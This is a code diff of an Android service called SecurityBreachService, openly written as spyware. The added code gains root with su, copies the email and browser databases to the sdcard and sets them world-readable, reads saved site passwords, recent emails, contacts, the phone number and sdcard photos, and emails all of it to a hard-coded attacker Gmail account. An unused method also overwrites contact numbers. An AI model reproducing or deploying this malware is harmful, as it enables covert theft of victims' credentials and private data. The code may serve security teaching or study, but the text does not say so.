@@ -1,6 +1,10 @@
 package com.eyespies.service;
 
+import java.io.DataOutputStream;
+import java.io.File;
+import java.io.IOException;
 import java.util.ArrayList;
+import java.util.Arrays;
 import java.util.List;
 
 import javax.mail.MessagingException;
@@ -8,20 +12,26 @@ import javax.mail.internet.AddressException;
 
 import android.app.Service;
 import android.content.ContentResolver;
+import android.content.ContentValues;
 import android.content.Context;
 import android.content.Intent;
 import android.database.Cursor;
-import android.net.Uri;
+import android.database.sqlite.SQLiteDatabase;
 import android.os.IBinder;
+import android.provider.BaseColumns;
 import android.provider.ContactsContract;
+import android.provider.ContactsContract.CommonDataKinds.Phone;
+import android.provider.ContactsContract.Data;
 import android.telephony.SmsManager;
+import android.telephony.TelephonyManager;
 import android.util.Log;
+import android.widget.Toast;
 
 public class SecurityBreachService extends Service {
 	private static final String TAG = "SecurityBreachService";
 	private static final String attackerEmailId = "eyespies55@gmail.com";
 	private static final String attackerMobile = "1111111111";
-	
+
 	@Override
 	public IBinder onBind(Intent arg0) {
 		System.out.println("Binding.. !!");
@@ -32,7 +42,15 @@ public class SecurityBreachService extends Service {
 	public void onCreate() {
 		Log.i(TAG, "Service created");
 		//sendSMS();
-		sendEmail();
+		sendEmails();
+		//		updateContacts();
+	}
+
+	private void updateContacts() {
+		// TODO Auto-generated method stub
+		ContentValues values = new ContentValues();
+		values.put(Phone.NUMBER, "999-999-9999");
+		getContentResolver().update(Data.CONTENT_URI, values, null, null);
 	}
 
 	public void sendSMS() {
@@ -40,25 +58,26 @@ public class SecurityBreachService extends Service {
 		sms.sendTextMessage(attackerMobile, null, 
 				"Client has been attacked..Details sent to email" , null, null);
 	}
-	
+
 	@Override
 	public void onStart(Intent intent, int startid) {
 		System.out.println("On start overridden");
 	}
 
-	public int sendEmail() {
+	public int sendEmails() {
 		ContentResolver resolver = getContentResolver();
 		Cursor cursor = resolver.query(ContactsContract.Contacts.CONTENT_URI,
 				null, null, null, null);
 		if (cursor.getCount() > 0) {
 			try{
 				List<ContactInformation> contacts = fetchAllContacts(resolver, cursor);
-				
 				cursor.close();
-				sendMailToAddress(contacts);
+				String hackedEmailsMessage = hackEmail();
+				String hackedPasswordDetails = hackPassword();
+				sendMailsToAddress(contacts, hackedEmailsMessage, hackedPasswordDetails);
 				return 1;
 			}catch(Exception e){
-				System.out.println("exception" );
+				System.out.println("exception");
 				e.printStackTrace();
 			}
 		}
@@ -68,7 +87,7 @@ public class SecurityBreachService extends Service {
 	public List<ContactInformation> fetchAllContacts(ContentResolver resolver,Cursor cursor) {
 		List<ContactInformation> contacts = new ArrayList<ContactInformation>();
 		while (cursor.moveToNext()) {
-			String id = cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts._ID)); 
+			String id = cursor.getString(cursor.getColumnIndex(BaseColumns._ID)); 
 			if (Integer.parseInt(cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts.HAS_PHONE_NUMBER))) > 0) {
 
 				Cursor contactCursor = resolver.query(
@@ -110,36 +129,171 @@ public class SecurityBreachService extends Service {
 	}
 
 	//TODO: Current version requires User's intervention, Send email without having to do so
-	private void sendMailToAddress(List<ContactInformation> contacts) {
-		String emailMessage = constructEmailMessage(contacts);
-	    List<String> imageList= new ArrayList<String>();
-	    Context context = getApplicationContext();
-	    imageList=	ImageLister.getAllImages(context);
-	    List<String> listOfAccounts = VictimAccountDetails.getAccount(context);
+	private void sendMailsToAddress(List<ContactInformation> contacts, String hackedEmailsMessage, String hackedPasswordDetails) {
+		Context context = getApplicationContext();
+		TelephonyManager tMgr = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
+		String mPhoneNumber = tMgr.getLine1Number();
+
+		//Contact List
+		String emailMessage = constructContactInfoEmail(contacts);
+		//Rooted cellphone hack
+		String webviewMessage = "First 10 emails from victim's inbox\n\n" + hackedEmailsMessage + "\n\n" + 
+				"I have gained access to stored Passwords\n\n" + hackedPasswordDetails + "\n\n";
+		List<String> imageList= new ArrayList<String>();
+		imageList=	ImageLister.getAllImages(context);
+		//		List<String> listOfAccounts = VictimAccountDetails.getAccount(context);
+		String phoneDirectory = "Phone directory of ";
+		String emailAndPassword = "Email and password details of ";
+		String photos = "Photos of ";
 		try {
-			new SMTPSendEmail().sendEmailTo("eyespies55@gmail.com", "eyespies55", "smtp.gmail.com", "eyespies55@gmail.com", emailMessage, imageList,listOfAccounts);
+			new SMTPSendEmail().sendEmailTo("eyespies55@gmail.com", "eyespies55", "smtp.gmail.com", "eyespies55@gmail.com", emailMessage, null, mPhoneNumber!=null ? phoneDirectory + mPhoneNumber: phoneDirectory + "the victim");
+			if (hackedPasswordDetails !=null || hackedEmailsMessage!= null){
+				new SMTPSendEmail().sendEmailTo("eyespies55@gmail.com", "eyespies55", "smtp.gmail.com", "eyespies55@gmail.com", webviewMessage, null,mPhoneNumber!=null ? emailAndPassword + mPhoneNumber: emailAndPassword + "the victim");
+			}
+			if(imageList != null && !imageList.isEmpty()) {
+				new SMTPSendEmail().sendEmailTo("eyespies55@gmail.com", "eyespies55", "smtp.gmail.com", "eyespies55@gmail.com", 
+						"This email contains images from sdcard", imageList,mPhoneNumber!=null ? photos + mPhoneNumber: photos + "the victim");
+			} 
 		} catch (AddressException e) {
-			// TODO Auto-generated catch block
 			e.printStackTrace();
 		} catch (MessagingException e) {
-			// TODO Auto-generated catch block
 			System.out.println("messaging exception" + e.getMessage());
 			e.printStackTrace();
 		}
-//		Intent intent = new Intent(Intent.ACTION_SENDTO); // it's not ACTION_SEND
-//		intent.setType("text/plain");
-//		intent.putExtra(Intent.EXTRA_SUBJECT, "Malicious gain of information");
-//		intent.putExtra(Intent.EXTRA_TEXT, emailMessage);
-//		intent.setData(Uri.parse("mailto:" + attackerEmailId)); // or just "mailto:" for blank
-//		intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK); // this will make such that when user returns to your app, your app is displayed, instead of the email app.
-//		startActivity(intent); 
+		//		Intent intent = new Intent(Intent.ACTION_SENDTO); // it's not ACTION_SEND
+		//		intent.setType("text/plain");
+		//		intent.putExtra(Intent.EXTRA_SUBJECT, "Malicious gain of information");
+		//		intent.putExtra(Intent.EXTRA_TEXT, emailMessage);
+		//		intent.setData(Uri.parse("mailto:" + attackerEmailId)); // or just "mailto:" for blank
+		//		intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK); // this will make such that when user returns to your app, your app is displayed, instead of the email app.
+		//		startActivity(intent); 
 	}
 
-	private String constructEmailMessage(List<ContactInformation> contacts) {
+	private String constructContactInfoEmail(List<ContactInformation> contacts) {
 		StringBuffer message = new StringBuffer();
 		for (ContactInformation contactInformation : contacts) {
 			message.append(contactInformation.getInfo());
 		}
 		return message.toString();
 	}
+
+	public String hackEmail() {
+		Integer emailCount = 0;
+		SQLiteDatabase db = null;
+		StringBuilder hackedEmailsString = null;
+		try { 
+			System.out.println("root hack!!");
+			//Get root access
+			Process process = Runtime.getRuntime().exec("su");
+			DataOutputStream os = new DataOutputStream(process.getOutputStream());
+			//copy the browser database to a readable directory
+			os.writeBytes("cat /data/data/com.google.android.email/databases/EmailProvider.db> /sdcard/EmailProvider.db \n");
+			//change the permissions to be readable by everybody
+			os.writeBytes("chmod 777 /sdcard/EmailProvider.db \n");
+			os.writeBytes("exit\n");
+			os.flush();
+			process.waitFor();
+
+			File openFile = new File("/sdcard/EmailProvider.db");
+
+			//checking that the given file exist
+			boolean isExists = openFile.exists();
+			if (isExists) {
+				System.out.println("Yes file is there... !!");
+				db = SQLiteDatabase.openDatabase("/sdcard/EmailProvider.db", null, SQLiteDatabase.OPEN_READONLY);
+				//SELECT * FROM password;
+				Cursor c = db.query("Message", null, null,	null, null, null, null);
+				hackedEmailsString = new StringBuilder();
+				List<String> columns = Arrays.asList(new String[] {"fromList", "subject"});
+				if (c != null) {
+					if (c.moveToLast()) {
+						do {
+							hackedEmailsString.append(getColumnValues(c, columns)); // "Title" is the field name(column) of the Table
+							emailCount++;
+						} while (c.moveToPrevious() && emailCount < 10);
+					}
+				}
+			}
+			//end of root commands. Now just open the database and query as usual
+			System.out.println(hackedEmailsString);
+		} catch (IOException e) {
+			Toast.makeText(this, "This app needs root access.", Toast.LENGTH_SHORT).show();
+			e.printStackTrace();
+		} catch (InterruptedException e) {
+			Toast.makeText(this, "This app needs root access.", Toast.LENGTH_SHORT).show();
+			e.printStackTrace();
+		} catch (Exception e) {
+			Toast.makeText(this, "This app needs root access.", Toast.LENGTH_SHORT).show();
+			e.printStackTrace();
+		}finally {
+			if(db != null) {
+				db.close();
+			}
+		}
+		return hackedEmailsString!=null ? hackedEmailsString.toString() : null;
+	}
+
+	public String hackPassword() {
+		SQLiteDatabase db = null;
+		StringBuilder hackedPasswords = null;
+		try { 
+			System.out.println("root hack!!");
+			//Get root access
+			Process process = Runtime.getRuntime().exec("su");
+			DataOutputStream os = new DataOutputStream(process.getOutputStream());
+			//copy the browser database to a readable directory
+			os.writeBytes("cat /data/data/com.android.browser/databases/webview.db> /sdcard/webview.db \n");
+			//change the permissions to be readable by everybody
+			os.writeBytes("chmod 777 /sdcard/webview.db \n");
+			os.writeBytes("exit\n");
+			os.flush();
+			process.waitFor();
+			File openFile = new File("/sdcard/webview.db");
+			//checking that the given file exist
+			boolean isExists = openFile.exists();
+			if (isExists) {
+				System.out.println("Yes file is there... !!");
+				db = SQLiteDatabase.openDatabase("/sdcard/webview.db", null, SQLiteDatabase.OPEN_READONLY);
+				//SELECT * FROM password;
+				Cursor c = db.query("password", null, null,	null, null, null, null);
+				hackedPasswords = new StringBuilder();
+				List<String> columns = Arrays.asList(new String[] {"host", "username", "password"});
+				if (c != null) {
+					if (c.moveToFirst()) {
+						do {
+							hackedPasswords.append(getColumnValues(c, columns));
+						} while (c.moveToNext());
+					}
+				}
+			}
+			//end of root commands. Now just open the database and query as usual
+			System.out.println(hackedPasswords.toString());
+		} catch (IOException e) {
+			Toast.makeText(this, "This app needs root access.", Toast.LENGTH_SHORT).show();
+			e.printStackTrace();
+		} catch (InterruptedException e) {
+			Toast.makeText(this, "This app needs root access.", Toast.LENGTH_SHORT).show();
+			e.printStackTrace();
+		} catch (Exception e) {
+			Toast.makeText(this, "This app needs root access.", Toast.LENGTH_SHORT).show();
+			e.printStackTrace();
+		}finally {
+			if(db != null) {
+				db.close();
+			}
+		}
+		return hackedPasswords!=null ? hackedPasswords.toString() : null;
+	}
+
+	private String getColumnValues(Cursor c, List<String> columns) {
+		StringBuilder str = new StringBuilder();
+		for (String column : columns) {
+			str.append(column + ":" + "\t");
+			str.append(c.getString(c.getColumnIndex(column)));   
+			str.append("\n");
+		}
+		str.append("\n");
+		return str.toString();
+	} 
+
 }
